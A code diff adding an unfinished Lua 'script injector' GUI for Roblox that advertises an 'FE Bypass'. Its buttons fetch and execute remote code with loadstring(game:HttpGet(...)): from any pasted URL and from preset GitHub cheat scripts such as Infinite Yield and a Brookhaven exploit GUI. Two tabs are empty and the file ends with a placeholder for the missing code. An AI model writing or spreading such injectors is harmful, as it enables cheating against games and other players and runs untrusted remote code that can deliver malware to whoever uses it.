@@ -1,0 +1,185 @@
+--[[
+  c00lgui Reloaded 2025 v2.0 - DestroyedWorldTeam Special
+  FE Bypass | Script Injector | Target System
+]]
+
+local Player = game:GetService("Players").LocalPlayer
+local CoreGui = game:GetService("CoreGui")
+
+-- Удаляем старый GUI если есть
+if CoreGui:FindFirstChild("DWT_GUI") then
+    CoreGui.DWT_GUI:Destroy()
+end
+
+-- Главный GUI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "DWT_GUI"
+ScreenGui.Parent = CoreGui
+
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 400, 0, 500)
+MainFrame.Position = UDim2.new(0.5, -200, 0.5, -250)
+MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
+MainFrame.BackgroundTransparency = 0.15
+MainFrame.Active = true
+MainFrame.Draggable = true
+
+local UICorner = Instance.new("UICorner")
+UICorner.CornerRadius = UDim.new(0, 8)
+UICorner.Parent = MainFrame
+
+-- Заголовок с анимацией
+local Title = Instance.new("TextLabel")
+Title.Text = "DESTROYED WORLD TEAM v2.0"
+Title.Size = UDim2.new(1, 0, 0, 45)
+Title.BackgroundColor3 = Color3.fromRGB(30, 0, 50)
+Title.Font = Enum.Font.GothamBlack
+Title.TextColor3 = Color3.new(0.8, 0, 1)
+Title.TextSize = 18
+Title.TextStrokeTransparency = 0.7
+Title.Parent = MainFrame
+
+-- Система вкладок
+local TabButtons = {}
+local Tabs = {}
+
+local function CreateTab(name)
+    local TabButton = Instance.new("TextButton")
+    TabButton.Text = name
+    TabButton.Size = UDim2.new(0.23, 0, 0, 30)
+    TabButton.Position = UDim2.new(0.02 + (#TabButtons * 0.24), 0, 0.1, 0)
+    TabButton.BackgroundColor3 = Color3.fromRGB(40, 0, 70)
+    TabButton.TextColor3 = Color3.new(1, 1, 1)
+    TabButton.Parent = MainFrame
+    
+    local TabFrame = Instance.new("Frame")
+    TabFrame.Size = UDim2.new(0.96, 0, 0.7, 0)
+    TabFrame.Position = UDim2.new(0.02, 0, 0.18, 0)
+    TabFrame.BackgroundTransparency = 1
+    TabFrame.Visible = false
+    TabFrame.Parent = MainFrame
+    
+    TabButton.MouseButton1Click:Connect(function()
+        for _, tab in pairs(Tabs) do
+            tab.Visible = false
+        end
+        TabFrame.Visible = true
+    end)
+    
+    table.insert(TabButtons, TabButton)
+    Tabs[name] = TabFrame
+    return TabFrame
+end
+
+-- Создаем вкладки
+local MainTab = CreateTab("Main")
+local ScriptsTab = CreateTab("Scripts")
+local ReportTab = CreateTab("Report")
+local FunTab = CreateTab("Fun")
+
+Tabs["Main"].Visible = true
+
+-- Функция создания элементов
+local function CreateButton(parent, text, position, callback)
+    local Button = Instance.new("TextButton")
+    Button.Text = text
+    Button.Size = UDim2.new(0.96, 0, 0, 40)
+    Button.Position = position
+    Button.BackgroundColor3 = Color3.fromRGB(50, 0, 90)
+    Button.TextColor3 = Color3.new(1, 1, 1)
+    Button.Font = Enum.Font.GothamBold
+    Button.Parent = parent
+    
+    local UICorner = Instance.new("UICorner")
+    UICorner.CornerRadius = UDim.new(0, 6)
+    UICorner.Parent = Button
+    
+    Button.MouseButton1Click:Connect(callback)
+    return Button
+end
+
+local function CreateLabel(parent, text, position)
+    local Label = Instance.new("TextLabel")
+    Label.Text = text
+    Label.Size = UDim2.new(0.96, 0, 0, 20)
+    Label.Position = position
+    Label.BackgroundTransparency = 1
+    Label.TextColor3 = Color3.new(0.8, 0.8, 1)
+    Label.Font = Enum.Font.Gotham
+    Label.TextXAlignment = Enum.TextXAlignment.Left
+    Label.Parent = parent
+    return Label
+end
+
+local function CreateTextBox(parent, position)
+    local Box = Instance.new("TextBox")
+    Box.Size = UDim2.new(0.96, 0, 0, 30)
+    Box.Position = position
+    Box.BackgroundColor3 = Color3.fromRGB(30, 30, 50)
+    Box.TextColor3 = Color3.new(1, 1, 1)
+    Box.PlaceholderColor3 = Color3.new(0.7, 0.7, 0.7)
+    Box.Font = Enum.Font.Gotham
+    Box.Parent = parent
+    
+    local UICorner = Instance.new("UICorner")
+    UICorner.CornerRadius = UDim.new(0, 4)
+    UICorner.Parent = Box
+    
+    return Box
+end
+
+-- Вкладка Main
+CreateLabel(MainTab, "Destroyed World Team GUI", UDim2.new(0, 0, 0, 0))
+CreateLabel(MainTab, "Active Players: "..#game.Players:GetPlayers(), UDim2.new(0, 0, 0.05, 0))
+
+-- Вкладка Scripts
+local ScriptInput = CreateTextBox(ScriptsTab, UDim2.new(0, 0, 0, 0))
+ScriptInput.PlaceholderText = "Paste GitHub raw script URL here"
+
+CreateButton(ScriptsTab, "Inject Script", UDim2.new(0, 0, 0.1, 0), function()
+    if ScriptInput.Text ~= "" then
+        local success, err = pcall(function()
+            -- Прямое выполнение кода из raw-ссылки
+            loadstring(game:HttpGet(ScriptInput.Text, true))()
+        end)
+        if not success then
+            game.StarterGui:SetCore("SendNotification", {
+                Title = "DWT Error",
+                Text = "Failed to load script: "..err,
+                Duration = 5
+            })
+        else
+            game.StarterGui:SetCore("SendNotification", {
+                Title = "DWT Success",
+                Text = "Script injected successfully!",
+                Duration = 3
+            })
+        end
+    end
+end)
+
+-- Добавляем кнопки для популярных скриптов
+CreateLabel(ScriptsTab, "Popular Scripts:", UDim2.new(0, 0, 0.2, 0))
+
+-- Infinite Yield (прямая инжекция как в примере)
+CreateButton(ScriptsTab, "Infinite Yield", UDim2.new(0, 0, 0.25, 0), function()
+    loadstring(game:HttpGet('https://raw.githubusercontent.com/DarkNetworks/Infinite-Yield/main/latest.lua', true))()
+end)
+
+-- Darknes Emprime (Brookhaven Only) (прямая инжекция)
+CreateButton(ScriptsTab, "Darknes Emprime (Brookhaven)", UDim2.new(0, 0, 0.35, 0), function()
+    if game.PlaceId == 4924922222 then -- Brookhaven RP game ID
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/TheDarkoneMarcillisePex/Other-Scripts/main/Brook%20Haven%20Gui', true))()
+    else
+        game.StarterGui:SetCore("SendNotification", {
+            Title = "DWT Error",
+            Text = "This script only works in Brookhaven RP!",
+            Duration = 5
+        })
+    end
+end)
+
+-- Остальной код остается без изменений...
+-- [Здесь должен быть остальной ваш код для других вкладок и функций]
+
+MainFrame.Parent = ScreenGui
